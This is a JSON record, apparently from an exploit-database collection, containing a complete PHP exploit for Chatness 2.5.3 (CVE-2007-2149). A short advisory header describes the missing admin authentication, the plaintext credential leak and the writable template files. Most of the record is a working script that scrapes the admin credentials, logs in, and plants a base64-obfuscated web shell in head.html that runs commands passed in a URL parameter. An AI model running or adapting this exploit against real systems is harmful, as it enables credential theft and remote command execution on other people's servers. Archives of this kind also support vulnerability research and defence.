{
  "id": "3725",
  "title": "Chatness 2.5.3 - &#039;/options.php/save.php&#039; Remote Code Execution",
  "cve": "CVE-2007-2149",
  "vuln_type": "rce",
  "code": "<?/*\r\nFiles: options.php, save.php\r\nAffects: Chatness <= 2.5.3\r\nDate: 12th April 2007\r\n\r\nIssue Description:\r\n===========================================================================\r\nChatness suffers with two main vulnerabilities, the first of these in\r\n/admin/options.php the problems occur because the script first fails to\r\nverify if the user is in fact an administrator and secondly it prints the\r\nadministrators username and password in plain text as part of the pre-filled\r\nform.\r\n\r\nThe second issue occurs in /admin/save.php and /index.php while save.php\r\nlimits writing to just .html extended filenames it is possible for an\r\nattacker to overwrite either foot.html or head.html to contain arbitrary php\r\ncode which would then be executed when included by index.php\r\n===========================================================================\r\n\r\nScope:\r\n===========================================================================\r\nCombined these two seperate issues will allow an attacker to gain access to\r\nthe system and execute code/commands of their choice.\r\n===========================================================================\r\n\r\nRecommendation:\r\n===========================================================================\r\nUntil a patch is availible it would be advisable to chmod both foot.html\r\nand head.html to a mode that makes them unwritable by the web server, this\r\nwill minimize the risk of arbitrary code execution.\r\n===========================================================================\r\n\r\nDiscovered By: Gammarays\r\n*/?>\r\n\r\n\r\n<?php\r\n\r\necho \"########################################################\\n\";\r\necho \"#   Special Greetings To - Timq,Warpboy,The-Maggot     #\\n\";\r\necho \"########################################################\\n\\n\\n\";\r\n\r\n$payload = \"JTNDJTNGcGhwK2lmJTI4aXNzZXQlMjglMjRfR0VUJTVCJTI3Y21kJTI3JTVEJTI5JTI5JTdCZWNobytzaGVsbF9leGVjJTI4dXJsZGVjb2RlJTI4JTI0X0dFVCU1QiUyN2NtZCUyNyU1RCUyOSUyOSUzQmRpZSUyOCUyOSUzQiU3RCUzRiUzRQ==\";\r\n$payload = base64_decode($payload);\r\n\r\n\r\nif($argc!=2) die(\"Usage: <url> \\n\\tEx: http://www.example.com/chatness/\\n\");\r\n\r\n$url = $argv[1];\r\n\r\n$ch = curl_init($url . \"admin/options.php\");\r\nif(!$ch) die(\"Error Initializing CURL\");\r\n\r\necho \"[ ] Attempting To Fetch Admin Login...\\n\";\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Connecting To Target\");\r\n\r\n$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);\r\nif($httpresult!=200) die(\"Error - URL Appears To Be Incorrect\");\r\n\r\n//Not good - but it works...sometimes\r\n$junkarray = explode(\"id=\",$res);\r\n$junkarray = explode(\"\\\"\",$junkarray[14]);\r\n$username = $junkarray[3];\r\n\r\n$junkarray = explode(\"id=\",$res);\r\n$junkarray = explode(\"\\\"\",$junkarray[15]);\r\n$password = $junkarray[3];\r\n\r\necho \"[ ] Found Username And Password - \".$username.\" / \".$password.\"\\n\";\r\necho \"[ ] Logging In...\\n\";\r\n\r\n//Login\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"admin/login.php\");\r\ncurl_setopt($ch, CURLOPT_COOKIEJAR, \"mrcookie.dat\");\r\ncurl_setopt($ch, CURLOPT_POST,1);\r\ncurl_setopt($ch,\r\nCURLOPT_POSTFIELDS,\"user=\".$username.\"&pass=\".$password.\"&submit=Login\");\r\n$res = curl_exec($ch);\r\nif(!res) die(\"Error Connecting To Target\");\r\n\r\n$httpresult = curl_getinfo($ch,CURLINFO_HTTP_CODE);\r\nif($httpresult==200) die(\"Error Invalid Username/Password\");\r\n\r\necho \"[ ] Login Succeeded..\\n\";\r\n\r\n//Deploy Main Payload\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"admin/save.php?file=head\");\r\ncurl_setopt($ch, CURLOPT_COOKIEFILE, \"mrcookie.dat\");\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"html=\".$payload);\r\n$res = curl_exec($ch);\r\nif(!res) die(\"Error Connecting To Target\");\r\n\r\necho \"[ ] Payload Deployed\\n\";\r\necho \"[ ] Shell Accessible at \".$url.\"index.php?cmd=<yourcommand>\";\r\ncurl_close($ch);\r\n?>\r\n\r\n# milw0rm.com [2007-04-12]",
  "url": "https://www.exploit-db.com/exploits/3725"
}